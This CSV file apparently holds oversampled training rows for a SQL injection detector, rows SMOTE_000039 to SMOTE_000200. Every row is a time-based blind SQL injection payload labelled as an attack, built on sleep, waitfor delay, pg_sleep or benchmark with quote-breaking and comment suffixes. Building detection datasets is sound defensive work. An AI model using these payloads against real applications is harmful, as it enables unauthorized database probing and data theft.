id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000039,attack,time,select sleep  (  5  )   and   (  'vwmx'  =  'vwmx,nearest_attack_euclidean,R000247,0.6642631843350549
SMOTE_000040,attack,time,1' waitfor delay '0:0:5'--,nearest_attack_euclidean,R000056,0.6100286170148143
SMOTE_000041,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R000213,1.1780081153104904
SMOTE_000042,attack,time,1  )   where 4600  =  4600 or sleep  (  5  )  --,nearest_attack_euclidean,R000155,0.39199294550251446
SMOTE_000043,attack,time,"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",nearest_attack_euclidean,R000087,0.4840425425093017
SMOTE_000044,attack,time,select sleep  (  5   )    )   ||',nearest_attack_euclidean,R000113,3.994781712003458
SMOTE_000045,attack,time,1' where 5455  =  5455 and sleep  (  5  )  --,nearest_attack_euclidean,R000183,1.3560646637477562
SMOTE_000046,attack,time,1'   )    )    rlike sleep  (  5  )  #,nearest_attack_euclidean,R000243,0.49571608016244534
SMOTE_000047,attack,time,1' or sleep  (  5  ) ,nearest_attack_euclidean,R000205,1.3749034879469544
SMOTE_000048,attack,time,1%' or sleep  (  5  )  #,nearest_attack_euclidean,R000215,0.9188940115075626
SMOTE_000049,attack,time,"1"" waitfor delay '0:0:5'--",nearest_attack_euclidean,R000162,0.6601413934776938
SMOTE_000050,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000035,0.8786226470201263
SMOTE_000051,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000009,0.1860274088510783
SMOTE_000052,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000030,1.7068444285701465
SMOTE_000053,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000049,0.0
SMOTE_000054,attack,time,select sleep  (  5  )   and   (  'vwmx'  =  'vwmx,nearest_attack_euclidean,R000247,0.03340881814808749
SMOTE_000055,attack,time,"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000098,0.12018049124386417
SMOTE_000056,attack,time,select sleep  (  5  )   and   (  'vwmx'  =  'vwmx,nearest_attack_euclidean,R000247,0.6613419033153962
SMOTE_000057,attack,time,1  )   waitfor delay '0:0:5' and   (  2993  =  2993,nearest_attack_euclidean,R000075,0.11245648713079365
SMOTE_000058,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000024,1.6827979770903039
SMOTE_000059,attack,time,"1%""  )   rlike sleep  (  5  )  #",nearest_attack_euclidean,R000126,1.0266854155053748
SMOTE_000060,attack,time,1'  )   rlike sleep  (  5  ) ,nearest_attack_euclidean,R000144,0.46490715980605185
SMOTE_000061,attack,time,"1"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000108,0.2912734329830535
SMOTE_000062,attack,time,1%'   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000043,0.046073585250380904
SMOTE_000063,attack,time,"1%"" waitfor delay '0:0:5' and ""%""  =  """,nearest_attack_euclidean,R000124,0.026252115124740016
SMOTE_000064,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.018259130081896453
SMOTE_000065,attack,time,1 waitfor delay '0:0:5'# opyp,nearest_attack_euclidean,R000196,0.30298987440158903
SMOTE_000066,attack,time,1'  )   waitfor delay '0:0:5' and   (  'peyv' like 'peyv,nearest_attack_euclidean,R000173,0.31254588405365485
SMOTE_000067,attack,time,1  )   where 7165  =  7165 and sleep  (  5  )  #,nearest_attack_euclidean,R000202,0.8156485244935933
SMOTE_000068,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000035,0.787019023602738
SMOTE_000069,attack,time,"waitfor delay '0:0:5' and   (  ""dmcu""  =  ""dmcu",nearest_attack_euclidean,R000308,0.9692847876760594
SMOTE_000070,attack,time,select sleep  (  5  )   and   (  4863  =  4863,nearest_attack_euclidean,R000221,1.5052511213418238
SMOTE_000071,attack,time,select sleep  (  5  )  --,nearest_attack_euclidean,R000190,1.2461978176016426
SMOTE_000072,attack,time,1  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000172,0.5066144803294346
SMOTE_000073,attack,time,waitfor delay '0:0:5' and    (    (   '%'  =  ',nearest_attack_euclidean,R000307,0.8835670355630237
SMOTE_000074,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000005,0.8429623103977094
SMOTE_000075,attack,time,1%'  )   or sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R000063,0.9769697147624212
SMOTE_000076,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000013,1.285700419638176
SMOTE_000077,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000021,0.48560825953874764
SMOTE_000078,attack,time,1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,nearest_attack_euclidean,R000071,0.02819197246927277
SMOTE_000079,attack,time,1 and sleep  (  5  )  # qcyj,nearest_attack_euclidean,R000167,0.7732439010024683
SMOTE_000080,attack,time,1   )    )     )   and sleep  (  5  )  #,nearest_attack_euclidean,R000223,0.8959605685222564
SMOTE_000081,attack,time,"1""  )   rlike sleep  (  5  )  #",nearest_attack_euclidean,R000231,0.2604324635561104
SMOTE_000082,attack,time,1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz,nearest_attack_euclidean,R000310,0.10418416276910634
SMOTE_000083,attack,time,1 waitfor delay '0:0:5'# opyp,nearest_attack_euclidean,R000196,0.30509058524495625
SMOTE_000084,attack,time,select sleep  (  5  )   and   (  'vwmx'  =  'vwmx,nearest_attack_euclidean,R000247,0.2734296821339839
SMOTE_000085,attack,time,"select sleep  (  5  )   and   (  ""tlbj"" like ""tlbj",nearest_attack_euclidean,R000127,0.6320983043376636
SMOTE_000086,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000242,0.8585399298614912
SMOTE_000087,attack,time,1 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000107,1.6429029303977765
SMOTE_000088,attack,time,"1%""   )    )     )   or sleep  (  5  )  #",nearest_attack_euclidean,R000272,1.238420556705192
SMOTE_000089,attack,time,"select sleep  (  5  )   and   (  ""tlbj"" like ""tlbj",nearest_attack_euclidean,R000127,0.7743142690489425
SMOTE_000090,attack,time,1 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000258,0.2556165519974093
SMOTE_000091,attack,time,waitfor delay '0:0:5' and    (    (   'yjsp' like 'yjsp,nearest_attack_euclidean,R000157,1.5306609824136743
SMOTE_000092,attack,time,"1%"" waitfor delay '0:0:5'--",nearest_attack_euclidean,R000238,2.7980134132004406
SMOTE_000093,attack,time,"waitfor delay '0:0:5' and   (  ""%""  =  """,nearest_attack_euclidean,R000139,0.8771927072863386
SMOTE_000094,attack,time,"1%"" waitfor delay '0:0:5'--",nearest_attack_euclidean,R000238,0.7856208891545008
SMOTE_000095,attack,time,1  )   and sleep  (  5  ) ,nearest_attack_euclidean,R000291,0.2934012738258099
SMOTE_000096,attack,time,1%'   )    )    and sleep  (  5  )  #,nearest_attack_euclidean,R000123,0.09835918350074867
SMOTE_000097,attack,time,1' and sleep  (  5  ) ,nearest_attack_euclidean,R000099,0.6817791196994151
SMOTE_000098,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000005,0.8394221195176981
SMOTE_000099,attack,time,1  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000125,1.4614240181199085
SMOTE_000100,attack,time,waitfor delay '0:0:5' and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000068,1.0301877296658106
SMOTE_000101,attack,time,1'   )    )    rlike sleep  (  5  )  #,nearest_attack_euclidean,R000243,1.2377875425130782
SMOTE_000102,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R000168,1.0216886912640986
SMOTE_000103,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.8260076463193564
SMOTE_000104,attack,time,"select sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000197,0.27918509922157325
SMOTE_000105,attack,time,"1""   )    )    or sleep  (  5  )  #",nearest_attack_euclidean,R000152,0.8985067529143468
SMOTE_000106,attack,time,select sleep  (  5  )  --,nearest_attack_euclidean,R000190,1.897013229535905
SMOTE_000107,attack,time,select sleep  (  5  )   and 'beuk'  =  'beuk,nearest_attack_euclidean,R000165,0.2797421394771264
SMOTE_000108,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000096,0.40208687258424786
SMOTE_000109,attack,time,"1"" and sleep  (  5  )  #",nearest_attack_euclidean,R000180,1.4556430972677052
SMOTE_000110,attack,time,"waitfor delay '0:0:5' and ""%""  =  """,nearest_attack_euclidean,R000091,0.5537423903079873
SMOTE_000111,attack,time,select pg_sleep  (  5  )   and 'qfaz' like 'qfaz,nearest_attack_euclidean,R000285,0.07928791966415147
SMOTE_000112,attack,time,1' where 9708  =  9708 or sleep  (  5  )  --,nearest_attack_euclidean,R000189,0.5446769508591806
SMOTE_000113,attack,time,1' or sleep  (  5  )   and 'udqz'  =  'udqz,nearest_attack_euclidean,R000240,1.4148122677221968
SMOTE_000114,attack,time,"select pg_sleep  (  5  )   and ""ilyw"" like ""ilyw",nearest_attack_euclidean,R000194,0.2569988719895867
SMOTE_000115,attack,time,1  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000172,0.8308434670945932
SMOTE_000116,attack,time,1%' and sleep  (  5  )  #,nearest_attack_euclidean,R000137,1.2864356947479758
SMOTE_000117,attack,time,"select sleep  (  5  )   and   (  ""tlbj"" like ""tlbj",nearest_attack_euclidean,R000127,0.04461742459823661
SMOTE_000118,attack,time,1   )    )    waitfor delay '0:0:5'--,nearest_attack_euclidean,R000265,0.5429452278853124
SMOTE_000119,attack,time,select pg_sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000219,1.2341138432186587
SMOTE_000120,attack,time,"1""   )    )     )   or sleep  (  5  )  #",nearest_attack_euclidean,R000280,0.265814787241808
SMOTE_000121,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000012,2.5315054217489834
SMOTE_000122,attack,time,select pg_sleep  (  5  )   and   (  1044  =  1044,nearest_attack_euclidean,R000141,0.019790109555641706
SMOTE_000123,attack,time,1  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000125,2.437708310268814
SMOTE_000124,attack,time,select sleep  (  5  )   and   (  'qcsv'  =  'qcsv,nearest_attack_euclidean,R000289,0.34663796901983085
SMOTE_000125,attack,time,"1""   )    )     )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R000079,0.028258507407958638
SMOTE_000126,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000028,2.4827748224608364
SMOTE_000127,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000028,0.41183186432783275
SMOTE_000128,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000006,0.03687476619221736
SMOTE_000129,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000088,1.0683939968267098
SMOTE_000130,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )   ",nearest_attack_euclidean,R000128,1.589237213900517
SMOTE_000131,attack,time,select pg_sleep  (  5  )   and 'rpka'  =  'rpka,nearest_attack_euclidean,R000086,0.542387350732692
SMOTE_000132,attack,time,1 where 7224  =  7224 and sleep  (  5  )  #,nearest_attack_euclidean,R000072,0.5752426059761077
SMOTE_000133,attack,time,"1%"" waitfor delay '0:0:5'--",nearest_attack_euclidean,R000238,0.2575887611838098
SMOTE_000134,attack,time,select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,nearest_attack_euclidean,R000059,0.7162134566761925
SMOTE_000135,attack,time,1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr,nearest_attack_euclidean,R000065,0.2480823342887575
SMOTE_000136,attack,time,"1 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000080,0.2770886037975335
SMOTE_000137,attack,time," select sleep  (  5  )   and   (  ""tlbp""  =  ""tlbp",nearest_attack_euclidean,R000081,0.7724777692636764
SMOTE_000138,attack,time,"1"" where 3227  =  3227 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000066,0.3972946313151279
SMOTE_000139,attack,time,"1""  )   where 6821  =  6821 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000171,0.1495238783191292
SMOTE_000140,attack,time,1' where 9003  =  9003 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000264,0.047583543374315494
SMOTE_000141,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000230,0.8398617138917291
SMOTE_000142,attack,time,1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,nearest_attack_euclidean,R000146,0.9240753373729133
SMOTE_000143,attack,time,"1"" waitfor delay '0:0:5' and ""syhx""  =  ""syhx",nearest_attack_euclidean,R000295,0.7661737071738393
SMOTE_000144,attack,time,1'   )    )     )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000084,0.00025006509113614366
SMOTE_000145,attack,time,"1%""   )    )     )   rlike sleep  (  5  )  #",nearest_attack_euclidean,R000237,0.15532504089585733
SMOTE_000146,attack,time,"1"" waitfor delay '0:0:5' and ""syhx""  =  ""syhx",nearest_attack_euclidean,R000295,0.21504784374198357
SMOTE_000147,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000006,0.9381285231051475
SMOTE_000148,attack,time,1  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000037,0.648964387669909
SMOTE_000149,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000048,1.456921742300318
SMOTE_000150,attack,time,1 waitfor delay '0:0:5',nearest_attack_euclidean,R000233,0.30882867656430446
SMOTE_000151,attack,time,select sleep  (  5  )   and 'beuk'  =  'beuk,nearest_attack_euclidean,R000165,0.04529030723347276
SMOTE_000152,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000024,0.1268555961008351
SMOTE_000153,attack,time,1 or sleep  (  5  )  #,nearest_attack_euclidean,R000210,0.6522664181160481
SMOTE_000154,attack,time,select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,nearest_attack_euclidean,R000061,1.459840529901519
SMOTE_000155,attack,time,"1%""  )   or sleep  (  5  )  #",nearest_attack_euclidean,R000257,0.8278418467507201
SMOTE_000156,attack,time,"1"" where 3740  =  3740 rlike sleep  (  5  )  #",nearest_attack_euclidean,R000212,0.3487544354954104
SMOTE_000157,attack,time,1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,nearest_attack_euclidean,R000071,0.6539461668012907
SMOTE_000158,attack,time,"select pg_sleep  (  5  )   and ""zhsc""  =  ""zhsc",nearest_attack_euclidean,R000136,0.6266987380695109
SMOTE_000159,attack,time,1' or sleep  (  5  ) ,nearest_attack_euclidean,R000205,0.8886500571370491
SMOTE_000160,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000177,0.13076161601925565
SMOTE_000161,attack,time,1  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000125,0.8715081258115592
SMOTE_000162,attack,time,"1%""   )    )     )   and sleep  (  5  )  #",nearest_attack_euclidean,R000122,0.40589146703740187
SMOTE_000163,attack,time,1' where 9003  =  9003 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000264,0.03876066632499245
SMOTE_000164,attack,time,1  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000125,0.6416674701466276
SMOTE_000165,attack,time,1 and sleep  (  5  )  -- ruuv,nearest_attack_euclidean,R000042,0.7908661777359594
SMOTE_000166,attack,time,1%'  )   rlike sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R000224,1.291470152031123
SMOTE_000167,attack,time,1' rlike sleep  (  5  )   and 'gtfo'  =  'gtfo,nearest_attack_euclidean,R000103,0.06506811302534404
SMOTE_000168,attack,time,1 and sleep  (  5  ) ,nearest_attack_euclidean,R000302,0.16790263425849897
SMOTE_000169,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000024,0.15609394410227126
SMOTE_000170,attack,time,1%'   )    )    waitfor delay '0:0:5'--,nearest_attack_euclidean,R000244,0.5975833255989184
SMOTE_000171,attack,time,1   )    )    waitfor delay '0:0:5'--,nearest_attack_euclidean,R000265,0.5348623991756212
SMOTE_000172,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,0.6800967529821911
SMOTE_000173,attack,time,1%' or sleep  (  5  )  #,nearest_attack_euclidean,R000215,0.6222435407661641
SMOTE_000174,attack,time,"1%"" and sleep  (  5  )  #",nearest_attack_euclidean,R000305,0.008221817511659148
SMOTE_000175,attack,time,1'  )   waitfor delay '0:0:5' and   (  'peyv' like 'peyv,nearest_attack_euclidean,R000173,1.1071519636359604
SMOTE_000176,attack,time,"select sleep  (  5  )   and   (  ""innk""  =  ""innk",nearest_attack_euclidean,R000077,1.2473947167406167
SMOTE_000177,attack,time,1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #,nearest_attack_euclidean,R000161,0.2266451436608603
SMOTE_000178,attack,time,"waitfor delay '0:0:5' and    (    (   ""zili"" like ""zili",nearest_attack_euclidean,R000181,0.21703827288229766
SMOTE_000179,attack,time,1' or sleep  (  5  )   and 'udqz'  =  'udqz,nearest_attack_euclidean,R000240,0.6878154985648615
SMOTE_000180,attack,time,"1""  )   where 7588  =  7588 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000293,0.035254130899828734
SMOTE_000181,attack,time,"1%""  )   rlike sleep  (  5  )  #",nearest_attack_euclidean,R000126,0.059146961154766274
SMOTE_000182,attack,time,1 rlike sleep  (  5  ) ,nearest_attack_euclidean,R000312,1.2651382009795873
SMOTE_000183,attack,time,"1"" waitfor delay '0:0:5' and ""syhx""  =  ""syhx",nearest_attack_euclidean,R000295,0.12166399977270317
SMOTE_000184,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000062,0.1541138453542133
SMOTE_000185,attack,time,1%'  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000222,1.8169122063235559
SMOTE_000186,attack,time,1%'  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000222,0.5493158520691975
SMOTE_000187,attack,time,"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",nearest_attack_euclidean,R000045,0.8278854362278661
SMOTE_000188,attack,time,"select pg_sleep  (  5  )   and   (  ""pjql"" like ""pjql",nearest_attack_euclidean,R000057,0.06599184405541571
SMOTE_000189,attack,time,select sleep  (  5  )   and   (  4863  =  4863,nearest_attack_euclidean,R000221,0.4747716540137901
SMOTE_000190,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000014,0.3962240327743663
SMOTE_000191,attack,time,1' and sleep  (  5  ) ,nearest_attack_euclidean,R000099,0.37808486855102985
SMOTE_000192,attack,time,"1 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000080,0.05499273333263949
SMOTE_000193,attack,time,1 and sleep  (  5  )  #,nearest_attack_euclidean,R000279,1.0384475750130846
SMOTE_000194,attack,time,1' or sleep  (  5  )   and 'udqz'  =  'udqz,nearest_attack_euclidean,R000240,0.14710540070280728
SMOTE_000195,attack,time,1%'   )    )    waitfor delay '0:0:5'--,nearest_attack_euclidean,R000244,1.1075188579451651
SMOTE_000196,attack,time,1' where 8482  =  8482 or sleep  (  5  )  #,nearest_attack_euclidean,R000149,0.4110860102802178
SMOTE_000197,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R000213,0.10415801786624497
SMOTE_000198,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000053,0.2748157780891899
SMOTE_000199,attack,time,"1%"" and sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000249,0.3304757214110277
SMOTE_000200,attack,time,"1""  )   and sleep  (  5  )  #",nearest_attack_euclidean,R000225,0.66868010938157
